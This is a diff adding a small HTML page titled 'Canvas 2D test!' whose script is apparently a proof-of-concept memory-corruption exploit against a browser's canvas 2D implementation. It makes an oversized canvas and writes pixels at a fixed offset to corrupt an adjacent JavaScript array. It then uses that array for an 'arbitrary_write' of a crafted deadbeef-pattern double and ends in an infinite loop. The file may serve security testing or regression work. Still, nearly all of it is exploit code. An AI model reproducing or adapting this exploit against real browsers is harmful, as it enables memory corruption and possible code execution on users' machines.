@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Canvas 2D test!</title>
+    <style type="text/css">
+        body {
+            background-color: #000;
+            color: #fff;
+            /* another css comment */
+        }
+
+        canvas {
+            border-width: 1px;
+            border-style: solid;
+            border-color: #fff;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            ctx = document.getElementById("foo").getContext("2d");
+
+            function write_at_offset(offset, val) {
+                ctx.strokeRect(offset / 4, 0, 1, 1);
+                ctx.fillStyle = val;
+                ctx.fillRect(offset / 4, 0, 1, 1);
+            }
+
+            var a = [1, 2, 3];
+
+            function arbitrary_write(rotated_address_as_color, value_as_double) {
+                write_at_offset(105084, rotated_address_as_color)
+                a[0] = value_as_double
+            }
+
+
+            deadbeef_double = -11885959663473424403767526989868712211998651175050994885619303016301398155916650747930379869929719770188769976194641129488039599955852478099551682560.000000;
+            arbitrary_write('#3ff16403', deadbeef_double)
+
+            for (; ;) { }
+        });
+    </script>
+</head>
+
+<body link="#44f" vlink="#c4c" background="90s-bg.png">
+    <canvas id="foo" width="322122547" height="10"></canvas>
+</body>
+
+</html>
